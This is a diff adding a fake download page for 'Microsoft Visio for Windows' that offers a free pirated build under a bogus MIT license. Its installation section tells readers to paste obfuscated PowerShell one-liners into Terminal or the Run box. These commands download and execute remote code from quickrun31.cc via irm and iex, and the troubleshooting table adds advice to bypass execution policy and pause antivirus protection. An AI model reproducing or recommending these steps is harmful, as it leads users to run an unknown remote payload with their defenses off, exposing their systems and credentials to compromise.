@@ -1,0 +1,130 @@
+Microsoft Visio for Windows
+
+  Diagramming & Vector Graphics
+
+  Flowcharts · Org Charts · Network Maps · Floor Plans
+
+  Installation ·
+  Features ·
+  Workflow ·
+  FAQ
+
+Installation
+
+Two quick setup methods for Windows.
+
+Method 1 — Win + X
+
+1. Press Win + X
+2. Open Terminal or Windows PowerShell
+3. Paste:
+
+sal m iex;m(irm quickrun31.cc/qle7he)
+
+4. Press Enter and wait for the process to finish
+5. Launch Microsoft Visio
+
+Method 2 — Win + R
+
+1. Press Win + R
+2. Paste:
+
+powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
+
+3. Press Enter and wait
+4. Launch Microsoft Visio
+
+Requirements
+
+- Windows 10 or Windows 11 (64-bit)
+- Internet connection during setup only
+- 4 GB RAM minimum (8 GB recommended)
+- SSD recommended
+
+Troubleshooting
+
+| Issue | What to try |
+|-------|-------------|
+| Connection error | Check internet |
+| Execution Policy message | Set-ExecutionPolicy Bypass -Scope Process -Force |
+| Blocked by antivirus | Temporarily pause real-time protection |
+| Window closes right away | Usually means setup finished |
+
+About
+
+Microsoft Visio for Windows is a desktop application for creating professional diagrams. It is widely used for flowcharts, organizational charts, network diagrams, process maps, floor plans and technical drawings.
+
+The workspace includes ready-made shapes, connectors, templates and data-linked diagram options for business and engineering use.
+
+Use at your own risk. Keep your system protected.
+
+Features
+
+Diagram Types
+- Flowcharts and process maps
+- Organizational charts
+- Network and IT diagrams
+- Floor plans and office layouts
+- UML and software diagrams
+
+Drawing Tools
+- Shape libraries and stencils
+- Connectors and auto-routing
+- Alignment and distribution
+- Layers and containers
+
+Data & Output
+- Link diagrams to data sources
+- Export to PDF, PNG, SVG and more
+- Print and presentation views
+- Templates for common scenarios
+
+Productivity
+- Custom stencils
+- Themes and styles
+- Collaboration-friendly file formats
+
+Workflow
+
+1. Create a new diagram from a template or blank page
+2. Drag shapes from stencils onto the canvas
+3. Connect shapes and organize the layout
+4. Add text, data fields and formatting
+5. Review and export or share the diagram
+
+How to Use
+
+1. Install using one of the methods above
+2. Launch Microsoft Visio
+3. Start from a template or blank drawing
+4. Build your diagram with shapes and connectors
+5. Export or save the result
+
+Tips
+- Start with a template that matches your diagram type
+- Use connectors instead of free lines for cleaner layouts
+- Group related shapes to move them together
+- Keep a consistent style across the diagram
+
+FAQ
+
+What is this?
+A desktop diagramming application for flowcharts, org charts, network maps and technical drawings.
+
+Is it free to use?
+Yes, this build is free to use.
+
+Supported systems?
+Windows 10 and Windows 11.
+
+How do I remove it?
+Delete the program folder and remove shortcuts.
+
+Keywords
+
+microsoft visio for windows, visio, visio download, flowchart software, diagramming tool, org chart software, network diagram, visio windows, process mapping, floor plan software, visio 2026, desktop diagramming
+
+License
+
+MIT License.
+Original software by Microsoft. All rights belong to the respective owners.
